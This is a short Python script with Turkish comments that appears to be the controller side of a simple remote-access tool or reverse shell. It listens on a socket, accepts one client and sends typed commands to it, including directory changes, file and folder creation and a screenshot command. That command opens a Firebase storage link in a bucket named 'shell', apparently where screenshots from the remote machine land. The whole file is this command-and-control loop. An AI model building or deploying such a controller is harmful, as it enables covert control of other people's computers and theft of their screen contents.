import socket
import time
import webbrowser

HOST = '127.0.0.1'  # Sunucu IP adresi (localhost)
PORT = 8080  # Sunucu port numarası

commands = {
    "cd {name}":"Change dir",
    "screen":"Take screenshot",
    "make {name}":"create file",
    "mkfolder {name}":"create folder",
    "help":"print this"
}

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()

    print(f"Sunucu {HOST}:{PORT} üzerinde dinleniyor...")

    conn, addr = s.accept()
    with conn:
        print(f"{addr} adresinden bağlantı kabul edildi.")

        while True:
            command = input("Çalıştırılacak komutu girin ('exit' yazarak çıkabilirsiniz): ")

            if command.lower() == 'exit':
                break
            elif command == "screen":
                time.sleep(1)
                webbrowser.open("https://firebasestorage.googleapis.com/v0/b/shell-8310e.appspot.com/o/images%2Fphoto%2Fph.png?alt=media&token=fbf5bc5b-b895-44a5-97ae-876779cbfbf9")
            elif command.startswith("help"):
                for comm,comm2 in commands.items():
                    print(f"Command {comm}, Describe {comm2}")

            conn.sendall(command.encode())  # İstemciye komut gönder
            data = conn.recv(1024).decode()  # İstemciden gelen sonucu al
            print(f"Istemciden gelen sonuç: \n{data}")  # İstemciden gelen sonucu ekrana bastır
